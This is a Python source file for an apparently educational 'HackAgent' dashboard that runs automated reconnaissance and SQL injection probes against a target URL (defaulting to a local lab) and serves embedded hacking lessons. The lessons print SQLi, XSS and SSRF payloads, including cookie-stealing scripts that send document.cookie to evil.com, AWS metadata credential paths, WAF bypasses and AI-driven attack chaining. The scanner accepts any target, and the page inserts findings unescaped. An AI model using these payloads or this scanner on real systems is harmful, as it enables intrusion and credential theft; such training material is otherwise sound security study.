#!/usr/bin/env python3
"""
HackAgent Dashboard - Real-time Hacking Visualization

See every step as it happens:
- Live reconnaissance
- Vulnerability discoveries
- Payload mutations
- Exploitation attempts
- Learning modules
"""

import asyncio
import json
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
import threading
import webbrowser

# Add hackagent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from aiohttp import web
import aiohttp_cors

# Global state
class HackingSession:
    def __init__(self):
        self.id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.target = ""
        self.phase = "idle"
        self.events: List[Dict] = []
        self.findings: List[Dict] = []
        self.payloads_tested: List[Dict] = []
        self.stats = {
            "requests_sent": 0,
            "vulns_found": 0,
            "endpoints_discovered": 0,
            "start_time": None,
            "elapsed_seconds": 0
        }
        self.learning_progress = {
            "recon": 0,
            "scanning": 0,
            "exploitation": 0,
            "reporting": 0
        }
    
    def add_event(self, event_type: str, message: str, data: Dict = None):
        event = {
            "timestamp": datetime.now().isoformat(),
            "type": event_type,
            "message": message,
            "data": data or {}
        }
        self.events.append(event)
        # Keep last 100 events
        if len(self.events) > 100:
            self.events = self.events[-100:]
        return event
    
    def to_dict(self):
        return {
            "id": self.id,
            "target": self.target,
            "phase": self.phase,
            "events": self.events[-20:],  # Last 20 for dashboard
            "findings": self.findings,
            "payloads_tested": self.payloads_tested[-10:],
            "stats": self.stats,
            "learning_progress": self.learning_progress
        }

# Global session
session = HackingSession()
clients: List[web.WebSocketResponse] = []


async def broadcast(data: Dict):
    """Send update to all connected clients."""
    message = json.dumps(data)
    for ws in clients[:]:
        try:
            await ws.send_str(message)
        except:
            clients.remove(ws)


async def websocket_handler(request):
    """WebSocket endpoint for real-time updates."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    clients.append(ws)
    
    # Send current state
    await ws.send_str(json.dumps({"type": "state", "data": session.to_dict()}))
    
    async for msg in ws:
        if msg.type == web.WSMsgType.TEXT:
            data = json.loads(msg.data)
            if data.get("action") == "start_attack":
                # Trigger attack from dashboard
                asyncio.create_task(run_attack(data.get("target")))
    
    clients.remove(ws)
    return ws


async def get_state(request):
    """Get current session state."""
    return web.json_response(session.to_dict())


async def get_lessons(request):
    """Get hacking lessons."""
    lessons = [
        {
            "id": 1,
            "title": "Reconnaissance Fundamentals",
            "difficulty": "beginner",
            "duration": "15 min",
            "topics": ["Passive recon", "Active recon", "OSINT", "Subdomain enumeration"],
            "content": """
# Lesson 1: Reconnaissance

## What is Recon?
Reconnaissance is the first phase of hacking. You gather information about your target WITHOUT attacking it yet.

## Types of Recon:

### 1. Passive Recon (Safe, no direct contact)
- WHOIS lookup (domain registration info)
- DNS enumeration
- Google dorking: `site:target.com filetype:pdf`
- Wayback Machine (historical pages)
- Shodan (exposed services)
- LinkedIn (employee info)

### 2. Active Recon (Direct contact with target)
- Port scanning (nmap)
- Service fingerprinting
- Directory bruteforcing
- Technology detection

## Tools:
```bash
# Passive
whois target.com
dig target.com ANY
theHarvester -d target.com -b google

# Active
nmap -sV -sC target.com
whatweb target.com
gobuster dir -u http://target.com -w wordlist.txt
```

## HackAgent Code:
```python
from tools.http_client import HackerHTTPClient

async with HackerHTTPClient() as client:
    # Fingerprint
    r = await client.get(target)
    server = r.headers.get('Server')  # Apache/2.4.41
    powered_by = r.headers.get('X-Powered-By')  # PHP/7.4
```

## Practice:
Try scanning Metasploitable at localhost:8080!
            """
        },
        {
            "id": 2,
            "title": "SQL Injection Mastery",
            "difficulty": "intermediate",
            "duration": "30 min",
            "topics": ["Error-based SQLi", "Union-based", "Blind SQLi", "WAF bypass"],
            "content": """
# Lesson 2: SQL Injection

## What is SQLi?
Injecting SQL code into application queries to:
- Bypass authentication
- Extract data
- Modify/delete data
- Execute commands (in some cases)

## Detection:
```
' → Error? SQLi possible!
' OR '1'='1 → Different response? Confirmed!
' AND '1'='2 → If response changes, injectable
```

## Types:

### 1. Error-Based (Easiest)
```sql
' AND 1=CONVERT(int, @@version)--
# Error shows: Microsoft SQL Server 2019
```

### 2. Union-Based (Data extraction)
```sql
' UNION SELECT 1,2,3--           # Find column count
' UNION SELECT 1,username,password FROM users--
```

### 3. Blind Boolean
```sql
' AND 1=1--  # True → Normal response
' AND 1=2--  # False → Different response
' AND SUBSTRING(username,1,1)='a'--  # Extract char by char
```

### 4. Blind Time-Based
```sql
' AND SLEEP(5)--  # Response delayed? Vulnerable!
' AND IF(1=1, SLEEP(5), 0)--
```

## WAF Bypass:
```python
from tools.payload_mutator import PayloadMutator

mutator = PayloadMutator()
payload = "' OR 1=1--"

# Mutations:
# URL encode: %27%20OR%201%3D1--
# Double encode: %2527%2520OR...
# Comment: '/**/OR/**/1=1--
# Case: ' oR 1=1--

mutations = mutator.mutate_all(payload)
```

## Practice:
```
Target: http://localhost:8080/mutillidae/
Vulnerable: /index.php?page=user-info.php&username=admin'--
```
            """
        },
        {
            "id": 3,
            "title": "XSS Attacks",
            "difficulty": "intermediate", 
            "duration": "25 min",
            "topics": ["Reflected XSS", "Stored XSS", "DOM XSS", "Cookie stealing"],
            "content": """
# Lesson 3: Cross-Site Scripting (XSS)

## What is XSS?
Injecting JavaScript that executes in victim's browser.

## Types:

### 1. Reflected XSS
Payload in URL, executed immediately:
```
https://target.com/search?q=<script>alert(1)</script>
```

### 2. Stored XSS
Payload saved to database, executes for all viewers:
```
Comment: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

### 3. DOM XSS
Payload manipulates DOM without server involvement:
```
https://target.com/page#<img src=x onerror=alert(1)>
```

## Payloads:
```html
<!-- Basic -->
<script>alert(1)</script>

<!-- IMG tag -->
<img src=x onerror=alert(1)>

<!-- SVG -->
<svg/onload=alert(1)>

<!-- Event handlers -->
<body onload=alert(1)>
<div onmouseover=alert(1)>hover me</div>

<!-- Without parentheses (WAF bypass) -->
<img src=x onerror=alert`1`>

<!-- Cookie stealer -->
<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>
```

## Filter Bypass:
```python
# If <script> blocked:
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

# If alert blocked:
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>[].constructor.constructor('alert(1)')()</script>

# If = blocked:
<script>alert(String.fromCharCode(88,83,83))</script>
```
            """
        },
        {
            "id": 4,
            "title": "SSRF Attacks",
            "difficulty": "advanced",
            "duration": "30 min",
            "topics": ["Internal network access", "Cloud metadata", "Protocol smuggling"],
            "content": """
# Lesson 4: Server-Side Request Forgery (SSRF)

## What is SSRF?
Making the server fetch URLs on your behalf, accessing:
- Internal services (localhost, 127.0.0.1)
- Cloud metadata (169.254.169.254)
- Internal network (192.168.x.x)

## High-Value Targets:

### AWS Metadata (CRITICAL - $$$)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns AWS access keys!
```

### Internal Services
```
http://localhost:8080/admin
http://127.0.0.1:6379/  # Redis
http://10.0.0.1/     # Internal network
```

## Bypass Techniques:
```python
# Decimal IP
http://2130706433/  # = 127.0.0.1

# IPv6
http://[::1]/
http://[::ffff:127.0.0.1]/

# Domain that resolves to 127.0.0.1
http://localtest.me/
http://127.0.0.1.nip.io/

# URL tricks
http://evil.com@127.0.0.1/
http://127.0.0.1#@evil.com/
```

## Where to Find SSRF:
- Webhook URLs
- PDF generators
- Image fetchers
- URL preview features
- Import from URL
- Proxy features

## Bounty Range: $5,000 - $100,000
Capital One breach was SSRF → AWS creds → 100M records
            """
        },
        {
            "id": 5,
            "title": "Using AI for Hacking",
            "difficulty": "advanced",
            "duration": "20 min",
            "topics": ["AI-assisted recon", "Payload generation", "Pattern recognition"],
            "content": """
# Lesson 5: AI-Optimized Hacking

## Why AI + Hacking?
- Pattern recognition across thousands of responses
- Intelligent payload mutation
- Automated hypothesis generation
- 24/7 scanning without fatigue

## HackAgent Architecture:
```
┌──────────────────────────────────────────┐
│              HACKER MIND                  │
│  ┌────────────┐  ┌────────────────────┐  │
│  │ OBSERVE    │  │ Generate hypotheses │  │
│  │ responses  │→ │ "SQLi possible?"    │  │
│  └────────────┘  └────────────────────┘  │
│         │                   │            │
│         ▼                   ▼            │
│  ┌────────────┐  ┌────────────────────┐  │
│  │ ADAPT to   │  │ Chain findings     │  │
│  │ defenses   │← │ Low + Low = High   │  │
│  └────────────┘  └────────────────────┘  │
└──────────────────────────────────────────┘
```

## AI Techniques:

### 1. Smart Payload Generation
```python
# AI knows MySQL detected, generates MySQL-specific:
if "mysql" in errors:
    payloads = [
        "' AND SLEEP(5)--",
        "' UNION SELECT @@version,2,3--",
        "' AND (SELECT 1 FROM mysql.user LIMIT 1)--"
    ]
```

### 2. WAF Fingerprinting & Bypass
```python
if waf_detected == "cloudflare":
    # AI generates Cloudflare-specific bypasses
    mutations = [
        unicode_encode(payload),
        fragment_payload(payload),
        http2_smuggle(payload)
    ]
```

### 3. Attack Chain Construction
```python
# AI combines low-severity findings:
findings = ["phpinfo exposed", "IDOR in user API"]
chain = ai.construct_chain(findings)
# → phpinfo leaks session path
# → IDOR accesses other sessions  
# → Session hijack = HIGH severity!
```

## Tips for AI-Assisted Hacking:
1. Feed AI lots of response data
2. Let it find patterns humans miss
3. Use for boring enumeration tasks
4. Human decides exploitation ethics
            """
        }
    ]
    return web.json_response(lessons)


async def run_attack(target: str):
    """Run attack with real-time updates."""
    global session
    
    session = HackingSession()
    session.target = target
    session.stats["start_time"] = datetime.now().isoformat()
    
    # Import here to avoid circular
    from tools.http_client import HackerHTTPClient
    from tools.payload_mutator import PayloadMutator
    
    await broadcast({"type": "phase", "phase": "recon", "target": target})
    session.phase = "recon"
    session.add_event("info", f"Starting attack on {target}")
    
    async with HackerHTTPClient(requests_per_second=10.0) as client:
        # Phase 1: Initial probe
        session.add_event("action", "Sending initial probe...")
        await broadcast({"type": "event", "data": session.events[-1]})
        
        r = await client.get(target)
        session.stats["requests_sent"] += 1
        
        session.add_event("success", f"Target responded: {r.status}", {
            "status": r.status,
            "server": r.headers.get("Server", "Unknown"),
            "time_ms": r.elapsed_ms
        })
        await broadcast({"type": "event", "data": session.events[-1]})
        await broadcast({"type": "stats", "data": session.stats})
        
        # Phase 2: Endpoint discovery
        session.phase = "enumeration"
        await broadcast({"type": "phase", "phase": "enumeration"})
        
        paths = ["/", "/admin", "/api", "/login", "/robots.txt", "/phpinfo.php",
                 "/dvwa/", "/mutillidae/", "/phpMyAdmin/", "/dav/"]
        
        for path in paths:
            url = target.rstrip("/") + path
            session.add_event("action", f"Checking {path}...")
            
            r = await client.get(url)
            session.stats["requests_sent"] += 1
            
            if r.status == 200:
                session.stats["endpoints_discovered"] += 1
                session.add_event("found", f"Discovered: {path}", {"status": 200})
                await broadcast({"type": "event", "data": session.events[-1]})
            
            await broadcast({"type": "stats", "data": session.stats})
            await asyncio.sleep(0.1)  # Visual delay
        
        # Phase 3: Vulnerability scanning
        session.phase = "scanning"
        await broadcast({"type": "phase", "phase": "scanning"})
        
        mutator = PayloadMutator()
        sqli_payloads = ["'", "' OR '1'='1", "admin'--", "1' AND '1'='1"]
        
        for payload in sqli_payloads:
            session.add_event("action", f"Testing SQLi: {payload}")
            await broadcast({"type": "event", "data": session.events[-1]})
            
            test_url = f"{target}/mutillidae/index.php?page=user-info.php&username={payload}"
            r = await client.get(test_url)
            session.stats["requests_sent"] += 1
            
            session.payloads_tested.append({
                "payload": payload,
                "url": test_url,
                "status": r.status,
                "vulnerable": "error" in r.body.lower() or "sql" in r.body.lower()
            })
            
            if "error" in r.body.lower() or "admin" in r.body.lower():
                session.stats["vulns_found"] += 1
                session.findings.append({
                    "type": "SQLi",
                    "severity": "high",
                    "location": test_url,
                    "payload": payload
                })
                session.add_event("vuln", f"VULNERABLE! SQLi with: {payload}", {
                    "type": "SQLi",
                    "severity": "high"
                })
                await broadcast({"type": "finding", "data": session.findings[-1]})
            
            await broadcast({"type": "payload", "data": session.payloads_tested[-1]})
            await broadcast({"type": "stats", "data": session.stats})
            await asyncio.sleep(0.2)
        
        # Phase 4: Complete
        session.phase = "complete"
        session.add_event("success", f"Attack complete! Found {session.stats['vulns_found']} vulnerabilities")
        await broadcast({"type": "phase", "phase": "complete"})
        await broadcast({"type": "state", "data": session.to_dict()})


# HTML Dashboard
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>HackAgent Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(90deg, #1a1a2e, #16213e);
            padding: 20px;
            border-bottom: 2px solid #00ff00;
        }
        .header h1 {
            font-size: 28px;
            text-shadow: 0 0 10px #00ff00;
        }
        .header .status {
            color: #888;
            margin-top: 5px;
        }
        .container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            padding: 20px;
        }
        .panel {
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
        }
        .panel h2 {
            color: #00ff00;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-bottom: 10px;
            font-size: 16px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
        }
        .stat-box {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
        }
        .stat-box .value {
            font-size: 32px;
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }
        .stat-box .label {
            color: #666;
            font-size: 12px;
            margin-top: 5px;
        }
        .phase-indicator {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        .phase {
            flex: 1;
            padding: 10px;
            background: #1a1a1a;
            border-radius: 5px;
            text-align: center;
            opacity: 0.3;
        }
        .phase.active {
            opacity: 1;
            background: #0f3d0f;
            border: 1px solid #00ff00;
            box-shadow: 0 0 10px rgba(0,255,0,0.3);
        }
        .phase.complete {
            opacity: 1;
            background: #1a3d1a;
        }
        .events {
            height: 300px;
            overflow-y: auto;
            font-size: 13px;
        }
        .event {
            padding: 5px 10px;
            border-left: 3px solid #333;
            margin-bottom: 5px;
        }
        .event.info { border-color: #0088ff; }
        .event.action { border-color: #ffaa00; }
        .event.found { border-color: #00ff00; }
        .event.vuln { border-color: #ff0000; background: #1a0000; }
        .event.success { border-color: #00ff00; }
        .event .time { color: #666; font-size: 11px; }
        .findings {
            max-height: 200px;
            overflow-y: auto;
        }
        .finding {
            background: #1a0000;
            border: 1px solid #ff0000;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
        }
        .finding .severity {
            display: inline-block;
            padding: 2px 8px;
            background: #ff0000;
            color: white;
            border-radius: 3px;
            font-size: 11px;
        }
        .finding .severity.high { background: #ff0000; }
        .finding .severity.medium { background: #ff8800; }
        .finding .severity.low { background: #ffff00; color: black; }
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            flex: 1;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 10px 15px;
            border-radius: 5px;
            font-family: inherit;
        }
        button {
            background: #00ff00;
            color: black;
            border: none;
            padding: 10px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-family: inherit;
        }
        button:hover {
            background: #00cc00;
        }
        .lessons-grid {
            display: grid;
            gap: 10px;
        }
        .lesson {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 5px;
            cursor: pointer;
            border: 1px solid #333;
        }
        .lesson:hover {
            border-color: #00ff00;
        }
        .lesson .title { font-weight: bold; }
        .lesson .meta { color: #666; font-size: 12px; margin-top: 5px; }
        .lesson .difficulty {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 11px;
        }
        .difficulty.beginner { background: #00ff00; color: black; }
        .difficulty.intermediate { background: #ffaa00; color: black; }
        .difficulty.advanced { background: #ff0000; color: white; }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            overflow-y: auto;
        }
        .modal-content {
            max-width: 800px;
            margin: 50px auto;
            padding: 30px;
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 10px;
        }
        .modal-content h1 { margin-bottom: 20px; }
        .modal-content pre {
            background: #0a0a0a;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        .close-btn {
            float: right;
            cursor: pointer;
            font-size: 24px;
        }
        .full-width { grid-column: 1 / -1; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 HackAgent Dashboard</h1>
        <div class="status" id="connectionStatus">Connecting...</div>
    </div>
    
    <div style="padding: 20px;">
        <div class="input-group">
            <input type="text" id="targetInput" placeholder="Target URL (e.g., http://localhost:8080)" value="http://localhost:8080">
            <button onclick="startAttack()">⚡ START ATTACK</button>
        </div>
        
        <div class="phase-indicator">
            <div class="phase" id="phase-idle">IDLE</div>
            <div class="phase" id="phase-recon">RECON</div>
            <div class="phase" id="phase-enumeration">ENUM</div>
            <div class="phase" id="phase-scanning">SCAN</div>
            <div class="phase" id="phase-complete">DONE</div>
        </div>
    </div>
    
    <div class="container">
        <div class="panel">
            <h2>📊 STATISTICS</h2>
            <div class="stats-grid">
                <div class="stat-box">
                    <div class="value" id="statRequests">0</div>
                    <div class="label">Requests Sent</div>
                </div>
                <div class="stat-box">
                    <div class="value" id="statEndpoints">0</div>
                    <div class="label">Endpoints Found</div>
                </div>
                <div class="stat-box">
                    <div class="value" id="statVulns">0</div>
                    <div class="label">Vulnerabilities</div>
                </div>
                <div class="stat-box">
                    <div class="value" id="statTime">0s</div>
                    <div class="label">Elapsed</div>
                </div>
            </div>
        </div>
        
        <div class="panel">
            <h2>🔴 LIVE EVENTS</h2>
            <div class="events" id="eventsLog"></div>
        </div>
        
        <div class="panel">
            <h2>⚠️ FINDINGS</h2>
            <div class="findings" id="findingsList"></div>
        </div>
        
        <div class="panel">
            <h2>🎯 PAYLOADS TESTED</h2>
            <div class="events" id="payloadsList"></div>
        </div>
        
        <div class="panel full-width">
            <h2>📚 HACKING LESSONS</h2>
            <div class="lessons-grid" id="lessonsList"></div>
        </div>
    </div>
    
    <div class="modal" id="lessonModal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeLesson()">×</span>
            <div id="lessonContent"></div>
        </div>
    </div>
    
    <script>
        let ws;
        let startTime;
        
        function connect() {
            ws = new WebSocket('ws://' + window.location.host + '/ws');
            
            ws.onopen = () => {
                document.getElementById('connectionStatus').textContent = '🟢 Connected';
                document.getElementById('connectionStatus').style.color = '#00ff00';
            };
            
            ws.onclose = () => {
                document.getElementById('connectionStatus').textContent = '🔴 Disconnected - Reconnecting...';
                document.getElementById('connectionStatus').style.color = '#ff0000';
                setTimeout(connect, 2000);
            };
            
            ws.onmessage = (e) => {
                const msg = JSON.parse(e.data);
                handleMessage(msg);
            };
        }
        
        function handleMessage(msg) {
            switch(msg.type) {
                case 'state':
                    updateState(msg.data);
                    break;
                case 'phase':
                    updatePhase(msg.phase);
                    if (msg.phase === 'recon') startTime = Date.now();
                    break;
                case 'event':
                    addEvent(msg.data);
                    break;
                case 'stats':
                    updateStats(msg.data);
                    break;
                case 'finding':
                    addFinding(msg.data);
                    break;
                case 'payload':
                    addPayload(msg.data);
                    break;
            }
        }
        
        function updateState(state) {
            updatePhase(state.phase);
            updateStats(state.stats);
            state.events.forEach(addEvent);
            state.findings.forEach(addFinding);
        }
        
        function updatePhase(phase) {
            document.querySelectorAll('.phase').forEach(p => {
                p.classList.remove('active', 'complete');
            });
            
            const phases = ['idle', 'recon', 'enumeration', 'scanning', 'complete'];
            const idx = phases.indexOf(phase);
            
            for (let i = 0; i <= idx; i++) {
                const el = document.getElementById('phase-' + phases[i]);
                if (i === idx) el.classList.add('active');
                else el.classList.add('complete');
            }
        }
        
        function updateStats(stats) {
            document.getElementById('statRequests').textContent = stats.requests_sent;
            document.getElementById('statEndpoints').textContent = stats.endpoints_discovered;
            document.getElementById('statVulns').textContent = stats.vulns_found;
            
            if (startTime) {
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                document.getElementById('statTime').textContent = elapsed + 's';
            }
        }
        
        function addEvent(event) {
            const log = document.getElementById('eventsLog');
            const time = new Date(event.timestamp).toLocaleTimeString();
            const div = document.createElement('div');
            div.className = 'event ' + event.type;
            div.innerHTML = '<span class="time">[' + time + ']</span> ' + event.message;
            log.insertBefore(div, log.firstChild);
        }
        
        function addFinding(finding) {
            const list = document.getElementById('findingsList');
            const div = document.createElement('div');
            div.className = 'finding';
            div.innerHTML = `
                <span class="severity ${finding.severity}">${finding.severity.toUpperCase()}</span>
                <strong>${finding.type}</strong><br>
                <small>${finding.location}</small><br>
                <code>${finding.payload}</code>
            `;
            list.insertBefore(div, list.firstChild);
        }
        
        function addPayload(payload) {
            const list = document.getElementById('payloadsList');
            const div = document.createElement('div');
            div.className = 'event ' + (payload.vulnerable ? 'vuln' : 'action');
            div.innerHTML = `<code>${payload.payload}</code> → ${payload.vulnerable ? '💀 VULNERABLE' : '✗ Not vulnerable'}`;
            list.insertBefore(div, list.firstChild);
        }
        
        function startAttack() {
            const target = document.getElementById('targetInput').value;
            ws.send(JSON.stringify({action: 'start_attack', target: target}));
            
            // Clear previous
            document.getElementById('eventsLog').innerHTML = '';
            document.getElementById('findingsList').innerHTML = '';
            document.getElementById('payloadsList').innerHTML = '';
        }
        
        async function loadLessons() {
            const resp = await fetch('/api/lessons');
            const lessons = await resp.json();
            
            const list = document.getElementById('lessonsList');
            lessons.forEach(lesson => {
                const div = document.createElement('div');
                div.className = 'lesson';
                div.onclick = () => showLesson(lesson);
                div.innerHTML = `
                    <div class="title">${lesson.title}</div>
                    <div class="meta">
                        <span class="difficulty ${lesson.difficulty}">${lesson.difficulty}</span>
                        ${lesson.duration} • ${lesson.topics.join(', ')}
                    </div>
                `;
                list.appendChild(div);
            });
        }
        
        function showLesson(lesson) {
            const modal = document.getElementById('lessonModal');
            const content = document.getElementById('lessonContent');
            content.innerHTML = marked.parse(lesson.content);
            modal.style.display = 'block';
        }
        
        function closeLesson() {
            document.getElementById('lessonModal').style.display = 'none';
        }
        
        // Markdown parser (simple)
        const marked = {
            parse: (md) => {
                return md
                    .replace(/^### (.*$)/gm, '<h3>$1</h3>')
                    .replace(/^## (.*$)/gm, '<h2>$1</h2>')
                    .replace(/^# (.*$)/gm, '<h1>$1</h1>')
                    .replace(/\`\`\`(\w*)\n([\s\S]*?)\`\`\`/g, '<pre><code>$2</code></pre>')
                    .replace(/\`([^\`]+)\`/g, '<code>$1</code>')
                    .replace(/\*\*([^\*]+)\*\*/g, '<strong>$1</strong>')
                    .replace(/\n/g, '<br>');
            }
        };
        
        // Start
        connect();
        loadLessons();
        
        // Update timer
        setInterval(() => {
            if (startTime) {
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                document.getElementById('statTime').textContent = elapsed + 's';
            }
        }, 1000);
    </script>
</body>
</html>
"""

async def index(request):
    return web.Response(text=DASHBOARD_HTML, content_type='text/html')


def create_app():
    app = web.Application()
    
    # CORS
    cors = aiohttp_cors.setup(app, defaults={
        "*": aiohttp_cors.ResourceOptions(
            allow_credentials=True,
            expose_headers="*",
            allow_headers="*"
        )
    })
    
    # Routes
    app.router.add_get('/', index)
    app.router.add_get('/ws', websocket_handler)
    app.router.add_get('/api/state', get_state)
    app.router.add_get('/api/lessons', get_lessons)
    
    # Apply CORS
    for route in list(app.router.routes()):
        cors.add(route)
    
    return app


def main():
    import sys
    sys.stdout.reconfigure(encoding='utf-8')
    print("=" * 60)
    print("HackAgent Dashboard")
    print("=" * 60)
    print("\nStarting server on http://localhost:8889")
    print("Opening browser...")
    
    # Open browser
    webbrowser.open("http://localhost:8889")
    
    # Run server
    app = create_app()
    web.run_app(app, host='localhost', port=8889, print=None)


if __name__ == "__main__":
    main()

